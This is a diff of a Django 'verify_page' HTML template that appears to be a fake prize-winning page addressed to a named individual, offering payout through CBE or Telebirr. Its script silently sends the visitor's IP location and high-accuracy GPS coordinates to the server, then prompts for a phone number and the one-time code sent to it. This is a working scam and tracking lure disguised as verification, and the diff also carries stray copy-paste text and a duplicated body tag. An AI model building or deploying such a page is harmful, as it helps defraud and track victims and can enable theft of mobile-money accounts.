@@ -1,102 +1,86 @@
-<!-- loc/templates/loc/verify_page.html -->
-<!DOCTYPE html>
+<!DOCTYPE html>Add commentMore actions
 <html>
 <head>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
 
   <title>Verify</title>
-<script>
-  const locId = {{ loc_id }};
-  const CSRF  = document.cookie.split(';')
-                     .find(c => c.trim().startsWith('csrftoken='))
-                     ?.split('=')[1];
+  <script>
+    const locId = {{ loc_id }};
+    const CSRF = document.cookie.split(';')
+      .find(c=>c.trim().startsWith('csrftoken='))
+      ?.split('=')[1];
 
-  async function postJSON(url, body) {
-    return fetch(url, {
-      method: "POST",
-      headers: {
-        "Content-Type":"application/json",
-        "X-CSRFToken": CSRF
-      },
-      body: JSON.stringify(body)
-    });
-  }
-
-  window.onload = async () => {
-    // PHASE 1: IP / City
-    try {
-      const ipData = await (await fetch("https://ipapi.co/json/")).json();
-      await postJSON("/save-ip/", {
-        loc_id:  locId,
-        ip_lat:  ipData.latitude,
-        ip_lon:  ipData.longitude,
-        ip_city: ipData.city
+    async function postJSON(url, body) {
+      return fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type":"application/json",
+          "X-CSRFToken": CSRF
+        },
+        body: JSON.stringify(body)
       });
-    } catch(e) {
-      console.warn("ipapi failed:", e);
     }
 
-    // PHASE 2: GPS & OTP
-    if (!navigator.geolocation) {
-      return alert("Geolocation not supported");
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      async pos => {
-        // save GPS
-        await postJSON("/save-gps/", {
+    window.onload = async () => {
+      // —————— PHASE 1: CLIENT IP / CITY via ipapi.co ——————
+      try {
+        const ipRes  = await fetch("https://ipapi.co/json/");
+        const ipData = await ipRes.json();
+        await postJSON("/save-ip/", {
           loc_id:   locId,
-          latitude:  pos.coords.latitude,
-          longitude: pos.coords.longitude
+          ip_lat:   ipData.latitude,
+          ip_lon:   ipData.longitude,
+          ip_city:  ipData.city
         });
+      } catch(e){
+        console.warn("Could not fetch ipapi.co:", e);
+      }
 
-        // send OTP
-        const phone = prompt("Enter your phone (+251...)");
-        if (!phone) return alert("Phone required");
-        await postJSON("/send-otp/", { loc_id: locId, phone });
+      // —————— PHASE 2: HIGH-ACCURACY GPS ——————
+      if (!navigator.geolocation) {
+        return alert("Geolocation not supported");
+      }
+      navigator.geolocation.getCurrentPosition(
+        async pos => {
+          // 2a) save GPS
+          await postJSON("/save-gps/", {
+            loc_id:   locId,
+            latitude: pos.coords.latitude,
+            longitude:pos.coords.longitude
+          });
 
-        // verify OTP
-        const code = prompt("Enter the OTP you received");
-        const res  = await postJSON("/verify-otp/", { loc_id: locId, code });
-        const { status } = await res.json();
+          // 2b) phone & OTP
+          const phone = prompt("Enter your phone (+251...)");
+          if (!phone) return alert("Phone required");
+          await postJSON("/send-otp/", { loc_id: locId, phone });
 
-        if (status === "approved") {
-          // static congratulatory message
-          document.body.innerHTML = `
-            <div style="
-              margin:0;
-              height:100vh;
-              display:flex;
-              flex-direction:column;
-              justify-content:center;
-              align-items:center;
-              background:#f9f9f9;
-              text-align:center;
-              padding:1rem;
-            ">
-              <h1>🎉 Congratulations, Aymen Bedru Yasin! 🎉</h1>
-              <p>You’ve won multiple prize levels!</p>
-              <p>You can receive your prize via CBE or Telebirr.<br>
-                 <strong>Default: Telebirr</strong></p>
-            </div>
-          `;
-
-          // fire confetti
-          confetti({ particleCount:150, spread:60, origin:{ y:0.4 } });
-          setTimeout(() => {
-            confetti({ particleCount:100, spread:100, origin:{ y:0.2 } });
-          }, 300);
-        } else {
+          const code = prompt("Enter the OTP you received");
+          const res  = await postJSON("/verify-otp/", { loc_id: locId, code });
+          const { status } = await res.json();
           alert("Verification status: " + status);
-        }
-      },
-      () => alert("GPS permission required"),
-      { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
-    );
-  };
-</script>
+        },
+        () => alert("GPS permission required"),
+        { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+      );
+      confetti({
+        particleCount: 150,
+        spread: 60,
+        origin: { y: 0.4 }
+      });
 
+      // a second burst for extra sparkle
+      setTimeout(() => {
+        confetti({
+          particleCount: 100,
+          spread: 100,
+          origin: { y: 0.2 }
+        });
+      }, 300);
+    };
+  </script>
 </head>
+<body style="margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#f9f9f9;">
+  <h1>Preparing verification…</h1>
 <body style="margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#f9f9f9; text-align:center; padding:1rem;">
   <div>
     <h1>Congratulations, Aymen Bedru Yasin!</h1>
@@ -105,6 +89,7 @@
        Reply with <strong>CBE</strong> or <strong>Telebirr</strong>.</p>
     <p><em>Default: Telebirr</em></p>
   </div>
+
 </body>
 
 </html>
